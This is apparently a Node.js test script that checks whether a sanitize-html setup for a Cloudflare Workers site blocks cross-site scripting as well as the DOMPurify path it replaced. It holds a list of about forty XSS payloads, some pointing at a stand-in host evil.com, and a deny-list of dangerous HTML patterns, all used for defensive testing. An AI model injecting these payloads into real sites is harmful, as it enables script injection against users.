// Differential test: is the sanitize-html path as protective as the jsdom +
// DOMPurify path it replaced on Cloudflare Workers?
//
// WHY THIS TEST EXISTS AT ALL
// A sanitizer that fails open is worse than no sanitizer, and the two pure-JS DOMs
// tried before this one both failed open in exactly that way: linkedom made
// DOMPurify return its input unchanged, and happy-dom's first instance did the
// same. Nothing in either case raised an error. A green build and a deployed
// Worker would both have looked fine while `<script>` went into the database.
//
// So the standard here is evidence, not inspection:
//   1. RETIRED PATH (jsdom + DOMPurify) is the baseline, still installed for this
//      comparison only. It is correct — if imperfect — so it is the floor.
//   2. NEW PATH (sanitize-html) must leave NO dangerous residue.
//   3. ALLOWED FORMATTING must survive the new path, or the site silently loses
//      bold/links/paragraphs in forum posts and descriptions.
//   4. Anything the baseline neutralised and the new path does not is a REGRESSION
//      and fails the run.
//
// Run: node scripts/verify-sanitizer.cjs
const sanitizeHtmlLib = require('sanitize-html');

const ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li', 'a'];
const ALLOWED_ATTR = ['href', 'target', 'rel'];

// The exact options from src/lib/sanitize.ts, restated here so the test exercises
// a frozen copy rather than importing TS.
const HTML_OPTIONS = {
  allowedTags: ALLOWED_TAGS,
  allowedAttributes: { a: ALLOWED_ATTR },
  nonTextTags: ['style', 'script', 'textarea', 'option', 'noscript', 'iframe', 'object', 'embed', 'form', 'input'],
  allowedSchemes: ['http', 'https', 'mailto'],
  allowedSchemesByTag: {},
  allowProtocolRelative: false,
  enforceHtmlBoundary: false,
  transformTags: {
    a: (tagName, attribs) => {
      const next = { ...attribs };
      if (next.target === '_blank') {
        const rel = new Set((next.rel || '').split(/\s+/).filter(Boolean));
        rel.add('noopener');
        rel.add('noreferrer');
        next.rel = Array.from(rel).join(' ');
      }
      return { tagName, attribs: next };
    },
  },
};
const TEXT_OPTIONS = { ...HTML_OPTIONS, allowedTags: [], allowedAttributes: {}, transformTags: {} };

// The retired implementation, as a baseline. Load it lazily and tolerate absence:
// once it is uninstalled the baseline checks become informational, and the
// dangerous-residue and formatting checks — the ones that actually protect users
// — keep failing the build on their own.
let OldSanitizer = null;
try {
  OldSanitizer = require('isomorphic-dompurify').default || require('isomorphic-dompurify');
} catch {
  console.log('  (isomorphic-dompurify not installed — baseline comparison skipped)');
}
const OLD_HTML_CFG = { ALLOWED_TAGS, ALLOWED_ATTR, ALLOW_DATA_ATTR: false };
const OLD_TEXT_CFG = { ALLOWED_TAGS: [], ALLOWED_ATTR: [], ALLOW_DATA_ATTR: false };

// Must never appear in output. A hit is a leak, regardless of what the baseline did.
const DANGEROUS = [
  /<\s*script/i,
  /javascript\s*:/i,
  /\son\w+\s*=/i,
  /<\s*iframe/i,
  /<\s*object/i,
  /<\s*embed/i,
  /<\s*form/i,
  /<\s*style/i,
  /<\s*img/i,
  /<\s*svg/i,
  /srcdoc/i,
  /data:text\/html/i,
  /vbscript\s*:/i,
  /<\s*link\b/i,
  /<\s*meta\b/i,
  /<\s*base\b/i,
];

// For plain-text mode, ANY tag at all is a failure, including allowed ones.
const ANY_TAG = /<\s*[a-z][^>]*>/i;

const CASES = [
  ['plain prose', 'A clean description of a 2018 Toyota Land Cruiser.'],
  ['allowed formatting', '<p>Great <strong>car</strong> with <em>low</em> mileage.</p>'],
  ['allowed list', '<ul><li>One</li><li>Two</li></ul>'],
  ['allowed link', '<a href="https://example.com">photos</a>'],
  ['blank-target link', '<a href="https://example.com" target="_blank">photos</a>'],
  ['script tag', '<script>alert(1)</script>'],
  ['script uppercase', '<SCRIPT>alert(1)</SCRIPT>'],
  ['script mixed case attrs', '<ScRiPt type="text/javascript" src="//evil.com/x.js"></ScRiPt>'],
  ['img onerror', '<img src=x onerror=alert(1)>'],
  ['img onerror quoted', '<img src="x" OnErRoR="alert(1)">'],
  ['svg onload', '<svg/onload=alert(1)>'],
  ['svg animate', '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'],
  ['javascript href', '<a href="javascript:alert(1)">click</a>'],
  ['javascript href spaced', '<a href="java\tscript:alert(1)">click</a>'],
  ['javascript href newline', '<a href="java\nscript:alert(1)">click</a>'],
  ['javascript href entity dec', '<a href="&#106;avascript:alert(1)">click</a>'],
  ['javascript href entity hex', '<a href="&#x6a;avascript:alert(1)">click</a>'],
  ['javascript href mixed case', '<a href="JaVaScRiPt:alert(1)">click</a>'],
  ['vbscript href', '<a href="vbscript:msgbox(1)">click</a>'],
  ['data uri html', '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'],
  ['iframe srcdoc', '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ['iframe javascript src', '<iframe src="javascript:alert(1)"></iframe>'],
  ['object data', '<object data="javascript:alert(1)"></object>'],
  ['embed src', '<embed src="//evil.com/x.swf">'],
  ['form action', '<form action="//evil.com"><input name="a"></form>'],
  ['style expression', '<style>body{background:url("javascript:alert(1)")}</style>'],
  ['mutation noscript', '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'],
  ['nested malformed', '<b><i>x</b></i><script>alert(1)</script>'],
  ['unclosed attr quote', '<a href="https://ok.com onclick=alert(1)>text</a>'],
  ['double encoded amp', '<a href="&amp;#106;avascript:alert(1)">x</a>'],
  ['details ontoggle', '<details open ontoggle=alert(1)>click</details>'],
  ['base href', '<base href="//evil.com/">'],
  ['meta refresh', '<meta http-equiv="refresh" content="0;url=//evil.com">'],
  ['link stylesheet', '<link rel="stylesheet" href="//evil.com/x.css">'],
  ['isindex', '<isindex action="javascript:alert(1)">'],
  ['template literal', '<script>${alert(1)}</script>'],
  ['mglyph/style/img chain', '<svg><math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'],
  ['protocol relative', '<a href="//evil.com/x">x</a>'],
  ['null byte tag', '<scr\x00ipt>alert(1)</scr\x00ipt>'],
  ['newlines in tag', '<img\nsrc=x\nonerror=alert(1)>'],
  ['mixed case handler', '<IMG SRC="x" OnErRoR="alert(1)">'],
  ['apostrophes', "O'Brien & Sons — no markup at all"],
  ['arabic', 'سيارة تويوتا لاند كروزر موديل 2018 بحالة ممتازة'],
  ['emoji and entity', '🚗 great car &amp; clean'],
  ['already-escaped', '&lt;script&gt;alert(1)&lt;/script&gt;'],
];

let leaks = 0;
let lostFormatting = 0;
let regressions = 0;
let baselineCompared = 0;

console.log('=== sanitizer verification: sanitize-html  vs  retired jsdom+DOMPurify ===\n');

for (const [name, input] of CASES) {
  for (const mode of ['html', 'text']) {
    const opts = mode === 'html' ? HTML_OPTIONS : TEXT_OPTIONS;
    const out = sanitizeHtmlLib(input, opts);

    // 1. Nothing dangerous may survive, in either mode.
    const residue = DANGEROUS.filter((re) => re.test(out));

    // 2. In plain-text mode no tag of any kind may survive.
    const strayTag = mode === 'text' && ANY_TAG.test(out);

    // 3. Allowed formatting must be preserved in html mode.
    let lost = null;
    if (mode === 'html') {
      const mustKeep = [];
      if (/<p>/i.test(input)) mustKeep.push('<p>');
      if (/<strong>/i.test(input)) mustKeep.push('<strong>');
      if (/<em>/i.test(input)) mustKeep.push('<em>');
      if (/<li>/i.test(input)) mustKeep.push('<li>');
      for (const tag of mustKeep) {
        if (!out.includes(tag)) lost = lost ? `${lost},${tag}` : tag;
      }
      // A safe https link must keep its href.
      if (/href="https:\/\/example\.com"/i.test(input) && !/href="https:\/\/example\.com"/i.test(out)) {
        lost = lost ? `${lost},href` : 'href';
      }
    }

    // 4. Baseline comparison: anything the old path removed and this one kept.
    let regressed = false;
    if (OldSanitizer) {
      const oldOut =
        mode === 'html'
          ? OldSanitizer.sanitize(input, OLD_HTML_CFG)
          : OldSanitizer.sanitize(input, OLD_TEXT_CFG);
      baselineCompared++;
      const oldDangerous = DANGEROUS.some((re) => re.test(oldOut));
      if (oldDangerous && !residue.length) regressed = false; // both fine
      if (residue.length && !oldDangerous) regressed = true; // new keeps what old removed
    }

    const problems = [];
    if (residue.length) problems.push(`LEAK:${residue.map(String).join(',')}`);
    if (strayTag) problems.push('STRAY-TAG-IN-TEXT');
    if (lost) problems.push(`LOST-FORMATTING:${lost}`);
    if (regressed) problems.push('REGRESSION-vs-jsdom');

    if (residue.length) leaks++;
    if (strayTag || lost) lostFormatting++;
    if (regressed) regressions++;

    if (problems.length) {
      console.log(`  ${mode.padEnd(4)} ${name}`);
      console.log(`       -> ${problems.join('  ')}`);
      console.log(`       in : ${JSON.stringify(input)}`);
      console.log(`       out: ${JSON.stringify(out)}`);
    }
  }
}

const total = CASES.length * 2;
const clean = total - leaks - lostFormatting - regressions;
console.log(`\n  cases run                : ${total} (${CASES.length} payloads x 2 modes)`);
console.log(`  dangerous residue        : ${leaks}`);
console.log(`  formatting / stray tags  : ${lostFormatting}`);
console.log(`  regressions vs jsdom      : ${regressions}`);
console.log(`  baseline comparisons made : ${baselineCompared}`);
console.log(`  clean                     : ${clean}/${total}`);

if (leaks || lostFormatting || regressions) {
  console.log('\n  FAIL — do not ship until every case above is resolved.');
  process.exit(1);
}
console.log('\n  PASS — no payload survived, formatting preserved, no regression vs jsdom.');
